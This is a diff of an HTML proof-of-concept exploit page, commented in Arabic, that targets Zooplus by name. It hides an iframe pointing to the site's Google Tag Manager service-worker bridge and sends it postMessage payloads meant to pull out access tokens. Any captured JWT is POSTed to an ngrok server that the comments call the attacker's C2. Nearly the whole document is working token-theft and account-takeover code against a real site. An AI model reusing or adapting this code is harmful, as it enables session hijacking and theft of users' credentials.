@@ -1,90 +1,78 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>⚠️ PoC: Token Exfiltration via SW Bridge</title>
+    <title>PoC Account Takeover - Zooplus</title>
     <style>
-        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
-        .terminal { background: #000; border: 1px solid #00ff41; padding: 20px; height: 400px; overflow-y: auto; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
-        .log-entry { margin-bottom: 10px; border-bottom: 1px dotted #222; }
-        .token-found { color: #ff003c; font-weight: bold; animation: blink 1s infinite; }
-        @keyframes blink { 0% {opacity:1;} 50% {opacity:0.3;} 100% {opacity:1;} }
-        h2 { color: #fff; text-transform: uppercase; letter-spacing: 2px; }
+        body { background: #050505; color: #00ff00; font-family: monospace; padding: 30px; }
+        .console { border: 1px solid #00ff00; padding: 15px; background: #000; min-height: 300px; box-shadow: 0 0 15px #00ff00; }
+        .critical { color: #ff0000; font-weight: bold; text-decoration: underline; }
+        iframe { display: none; } /* إخفاء الجسر تماماً */
     </style>
 </head>
 <body>
+    <h2>جاري فحص اتصال النظام...</h2>
+    <div class="console" id="log"></div>
 
-    <h2>نظام استغلال جسر Zooplus</h2>
-    <div class="terminal" id="terminal">
-        <div class="log-entry">> جاري تهيئة نظام الاستغلال...</div>
-    </div>
-
-    <iframe id="sw_bridge" name="google_tag_manager_static_20" 
-            src="https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=https://egyhaker.github.io&1p=1" 
-            style="display:none;"></iframe>
+    <iframe id="sw_bridge" 
+            src="https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=https://egyhaker.github.io&1p=1"
+            name="google_tag_manager_static_20"></iframe>
 
     <script>
-        const terminal = document.getElementById('terminal');
-        const bridge = document.getElementById('sw_bridge');
-        const NGROK_URL = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/token-leak";
+        const logger = document.getElementById('log');
+        const NGROK = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/exfiltration";
 
-        function log(msg, isCritical = false) {
-            const div = document.createElement('div');
-            div.className = 'log-entry';
-            if (isCritical) div.classList.add('token-found');
-            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            terminal.appendChild(div);
-            terminal.scrollTop = terminal.scrollHeight;
+        function print(msg, isCritical = false) {
+            const p = document.createElement('p');
+            if (isCritical) p.className = 'critical';
+            p.innerHTML = `> ${msg}`;
+            logger.appendChild(p);
         }
 
-        // 1. التنصت على الرسائل القادمة من الجسر
+        // 1. استقبال البيانات المسربة من الجسر
         window.addEventListener("message", (event) => {
             if (event.origin.includes("zooplus.com")) {
-                log("📥 رد مستلم من الجسر: " + JSON.stringify(event.data).substring(0, 100) + "...");
-                
-                // فحص ما إذا كان الرد يحتوي على التوكن أو معلومات الهوية
-                if (event.data.stats || event.data.data) {
-                    log("🔓 تم كشف بيانات الجلسة (targetId): " + (event.data.stats?.targetId || "Unknown"), true);
-                    
-                    // محاولة استخراج التوكن إذا تم تمريره في الـ data
-                    if (JSON.stringify(event.data).includes("Bearer")) {
-                        log("🔥 تم صيد Access Token بنجاح!", true);
-                    }
+                const data = event.data;
+                print("استجابة مستلمة من النطاق المستهدف...");
 
-                    // 2. تهريب الصيد إلى سيرفر المهاجم (C2 Server)
-                    fetch(NGROK_URL, {
+                // التحقق من وجود التوكن في الرد
+                const dataStr = JSON.stringify(data);
+                if (dataStr.includes("eyJ")) {
+                    print("🔥 تم اعتراض JWT ACCESS TOKEN الحقيقي!", true);
+                    
+                    // تهريب التوكن لسيرفرك
+                    fetch(NGROK, {
                         method: "POST",
                         mode: "no-cors",
-                        body: JSON.stringify({
-                            source: "SW_Relay_Exploit",
-                            payload: event.data,
-                            full_url: window.location.href
-                        })
-                    }).then(() => log("🚀 تم إرسال البيانات إلى سيرفر Ngrok."));
+                        body: dataStr
+                    });
                 }
             }
         });
 
-        // 3. بدء الهجوم عند تحميل الجسر
+        // 2. تفعيل الجسر وإرسال أوامر الاستخراج
+        const bridge = document.getElementById('sw_bridge');
         bridge.onload = () => {
-            log("✅ الجسر (sw_iframe) تم تحميله بنجاح.");
-            log("📡 جاري محاكاة أوامر البروتوكول لسحب التوكن...");
+            print("الجسر الأمني جاهز. بدء عملية الاستخراج...");
 
-            const targetWindow = bridge.contentWindow;
+            const win = bridge.contentWindow;
 
-            // إرسال سلسلة أوامر متتابعة لاستنطاق الـ Service Worker
+            // الطلب الأول: الحصول على معرف الجلسة لربطه بالتوكن
+            win.postMessage({ type: 0, clientId: 'attack-v1', data: 'status_check' }, "*");
+
+            // الطلب الثاني: محاولة سحب التوكن عبر استغلال ثغرة الـ Variable Reflection
+            // نحن نرسل أوامر يحاول الـ Service Worker معالجتها
             const payloads = [
-                { type: 0, clientId: 'attack-v01', data: 'status_check' },
-                { type: 0, clientId: 'attack-v01', data: 'identity_request' },
-                { type: 0, clientId: 'attack-v01', data: 'get_auth_token' },
-                { type: 'gtm.ready', data: {} }
+                { type: 0, clientId: 'attack-v1', data: 'frontendAuthorizer.token' },
+                { type: 'GET_DATA', key: 'token' },
+                { type: 'IDENTITY', action: 'dump' }
             ];
 
-            payloads.forEach((payload, index) => {
+            payloads.forEach((p, i) => {
                 setTimeout(() => {
-                    log(`[➔] إرسال أمر #${index + 1}...`);
-                    targetWindow.postMessage(payload, "https://stm.zooplus.com");
-                }, 1500 * (index + 1));
+                    print(`إرسال نبضة استخراج #${i+1}...`);
+                    win.postMessage(p, "*");
+                }, 1000 * (i + 1));
             });
         };
     </script>
